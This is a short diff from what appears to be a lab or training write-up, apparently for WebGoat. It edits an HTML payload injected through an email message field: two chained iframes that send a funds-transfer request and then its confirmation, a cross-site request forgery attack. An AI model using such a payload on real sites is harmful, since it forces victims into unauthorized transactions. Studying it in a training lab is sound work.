@@ -2,7 +2,7 @@ As it is explained in the Hint, this email message field is the one that is expl
 
 <iframe id="if1" width="500" height="300">
 </iframe>
-<iframe id="if2" src="attack?Screen=281&menu=900&transferFunds=400" width="500" height="300" onload="document.getElementById('if1').src='attack?Screen=281&menu=900&transferFunds=CONFIRM';">
+<iframe id="if2" src="attack?Screen=XXX&menu=YYY&transferFunds=400" width="500" height="300" onload="document.getElementById('if1').src='attack?Screen=XXX&menu=YYY&transferFunds=CONFIRM';">
 </iframe>
 
 
